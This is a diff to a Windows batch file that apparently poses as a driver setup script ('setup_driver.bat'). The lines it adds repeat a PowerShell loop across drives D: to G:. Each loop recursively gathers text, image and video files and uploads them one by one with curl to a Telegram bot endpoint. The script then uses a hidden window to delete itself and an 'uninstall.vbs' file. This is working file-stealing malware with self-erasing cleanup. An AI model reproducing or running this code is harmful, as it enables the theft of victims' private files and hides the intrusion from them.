@@ -12,6 +12,42 @@ foreach ($f in $files) { ^
     cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
 }"
 
+set pth=D:
+
+powershell -Command ^
+"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
+}"
+
+set pth=E:
+
+powershell -Command ^
+"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
+}"
+
+set pth=F:
+
+powershell -Command ^
+"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
+}"
+
+set pth=G:
+
+powershell -Command ^
+"$files = Get-ChildItem '%pth%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg,*.mp4 -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%id%\" -F \"document=@$path\" https://api.telegram.org/bot%tk%/sendDocument; ^
+}"
+
 start "" powershell -WindowStyle Hidden -Command "Start-Sleep 2; Remove-Item 'setup_driver.bat','uninstall.vbs' -Force"
 
 exit
